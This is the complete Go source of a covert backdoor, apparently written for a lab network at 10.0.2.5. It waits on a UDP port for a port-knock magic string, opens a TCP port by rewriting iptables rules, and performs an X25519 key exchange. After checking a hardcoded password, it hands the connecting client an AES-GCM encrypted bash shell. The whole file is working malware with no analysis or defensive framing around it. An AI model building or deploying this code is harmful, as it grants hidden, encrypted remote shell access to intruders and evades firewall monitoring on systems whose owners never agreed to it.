package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"syscall"
	"time"

	"golang.org/x/crypto/hkdf"
)

func seal(msg []byte, info []byte, gcm cipher.AEAD) []byte {
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	ct := gcm.Seal(nonce, nonce, msg, info)
	return ct
}

func open(buf []byte, info []byte, gcm cipher.AEAD) ([]byte, error) {
	nonce := buf[:gcm.NonceSize()]
	ct := buf[gcm.NonceSize():]
	return gcm.Open(nil, nonce, ct, info)
}

func errThread(stderr io.ReadCloser, conn net.Conn, gcm cipher.AEAD, info []byte) {
	buf := make([]byte, 1024)
	for {
		r, err := stderr.Read(buf)
		if err != nil {
			break
		}
		ct := seal(buf[:r], info, gcm)
		conn.Write(ct)
	}
}

func sendThread(stdout io.ReadCloser, conn net.Conn, gcm cipher.AEAD, info []byte) {
	buf := make([]byte, 1024)
	for {
		r, err := stdout.Read(buf)
		// The process pipe has closed
		if err != nil {
			break
		}
		ct := seal(buf[:r], info, gcm)
		conn.Write(ct)
	}
}

func recvThread(stdin io.WriteCloser, conn net.Conn, gcm cipher.AEAD, info []byte) {
	buf := make([]byte, 1052)
	for {
		r, err := conn.Read(buf)
		// The connection has closed from the other end
		if err != nil {
			stdin.Write([]byte("exit\n"))
			break
		}
		pt, err := open(buf[:r], info, gcm)
		if err != nil {
			stdin.Write([]byte("exit\n"))
			break
		}
		stdin.Write(pt)
		first := len(string(pt)) > 3 && string(pt[:3]) == "cd "
		second := len(string(pt)) == 3 && string(pt[:2]) == "cd"
		// Is a directory change
		if first || second {
			ct := seal([]byte(""), info, gcm)
			if first {
				// Check validity
				path := string(pt[3 : len(pt)-1])
				err := os.Chdir(path)
				if err != nil {
					continue
				}
			} else if second {
				path, _ := os.UserHomeDir()
				os.Chdir(path)
			}
			conn.Write(ct)
		}
	}
}

func endConnection(conn net.Conn) {
	fmt.Println("Closing connection...")
	conn.Close()
}

// Handles initial connection from a client to this backdoor
func handleConnection(conn net.Conn) {
	defer endConnection(conn)
	fmt.Printf("Serving %s\n", conn.RemoteAddr().String())
	var priv, _ = ecdh.Curve.GenerateKey(ecdh.X25519(), rand.Reader)
	var pub = priv.PublicKey()

	// First packet sent by client is supposed to be a public key
	// of length 32, and is also supposed to be on the curve
	buf := make([]byte, 1024)
	readLen, err := conn.Read(buf)
	if err != nil || readLen != 32 {
		println("Wrong length")
		return
	}
	// Bytes to public key
	remote, err := ecdh.X25519().NewPublicKey(buf[:readLen])
	if err != nil {
		return
	}

	// Compute shared key
	shared, err := priv.ECDH(remote)
	if err != nil {
		println("Unable to compute shared key")
		return
	}
	kdf := hkdf.New(sha256.New, shared, nil, nil)
	var gcmKey [32]byte
	var hmacKey [32]byte
	kdf.Read(gcmKey[:])
	kdf.Read(hmacKey[:])

	// Make a cipher
	c, _ := aes.NewCipher(gcmKey[:])
	gcm, _ := cipher.NewGCM(c)

	// Make an associated data with all of our sent packets
	info := []byte(conn.LocalAddr().String() + conn.RemoteAddr().String())
	hm := hmac.New(sha256.New, hmacKey[:])
	hm.Write(info)
	info = hm.Sum(nil)

	// Send the client our public key
	writeLen, err := conn.Write(pub.Bytes())
	if err != nil || writeLen != 32 {
		fmt.Println("Unable to send our public key")
		return
	}

	// Check that the next message is the correct password
	readLen, _ = conn.Read(buf)
	tempBuf := buf[:readLen]
	pt, err := open(tempBuf, info, gcm)
	if err != nil {
		fmt.Println("Decryption failed")
		return
	}
	if string(pt) != "foobar" {
		fmt.Println("Wrong magic word for protocol")
		return
	}

	// Ack the connection, password is correct
	conn.Write(seal([]byte("ack"), info, gcm))

	// Start the shell
	fmt.Println("Starting bash")
	bash := exec.Command("bash")
	stdin, _ := bash.StdinPipe()
	stdout, _ := bash.StdoutPipe()
	stderr, _ := bash.StderrPipe()
	bash.Start()

	// Start thread for listening and sending
	go errThread(stderr, conn, gcm, info[:])
	go sendThread(stdout, conn, gcm, info[:])
	go recvThread(stdin, conn, gcm, info[:])
	bash.Wait()
}

const (
	CONN_HOST    = "10.0.2.5"
	CONN_PORT    = "3333"
	CONN_UDPPORT = "6666"
	CONN_TYPE    = "tcp"
)

func openUDPPorts() {
	openInPort := exec.Command("iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
	openOutPort := exec.Command("iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "ACCEPT")
	openInPort.Run()
	openOutPort.Run()
}

func closeUDPPorts() {
	closeInPort := exec.Command("iptables", "-I", "INPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "DROP")
	closeOutPort := exec.Command("iptables", "-I", "OUTPUT", "-p", "udp", "--dport", CONN_UDPPORT, "-j", "DROP")
	closeInPort.Run()
	closeOutPort.Run()
}

func openPorts() {
	openInPort := exec.Command("iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
	openOutPort := exec.Command("iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "ACCEPT")
	openInPort.Run()
	openOutPort.Run()
}

func closePorts() {
	closeInPort := exec.Command("iptables", "-I", "INPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "DROP")
	closeOutPort := exec.Command("iptables", "-I", "OUTPUT", "-p", "tcp", "--dport", CONN_PORT, "-j", "DROP")
	closeInPort.Run()
	closeOutPort.Run()
}

func main() {
	// Makes sure we close iptables ports before forcefully quitting
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println("CLEANING UP PORTS")
		closePorts()
		closeUDPPorts()
		os.Exit(1)
	}()

	// Goroutine for TCP connection
	fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)
	tcpAddr, _ := net.ResolveTCPAddr(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	connAttempt := make(chan bool)
	connReady := make(chan bool)
	go func() {
		for {
			closePorts()
			connReady <- true
			<-connAttempt
			openPorts()
			sock, err := net.ListenTCP(CONN_TYPE, tcpAddr)
			if err != nil {
				fmt.Println("Error listening:", err.Error())
				os.Exit(1)
			}
			sock.SetDeadline(time.Now().Add(4 * time.Second))
			conn, err := sock.Accept()
			sock.Close()
			if err != nil {
				fmt.Println("Error accepting: ", err.Error())
				continue
			}

			// Handle connection
			handleConnection(conn)
		}
	}()

	// This part below silently listens for the magic word
	// to open up the tcp port
	udpAddr, _ := net.ResolveUDPAddr("udp", CONN_HOST+":"+CONN_UDPPORT)
	buf := make([]byte, 1024)
	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1)
	}
	for {
		<-connReady
		openUDPPorts()
		for {
			r, _ := conn.Read(buf)
			msg := string(buf[:r])
			if msg == "!@fizzbuzz@!" {
				break
			}
		}
		closeUDPPorts()
		connAttempt <- true
	}
}
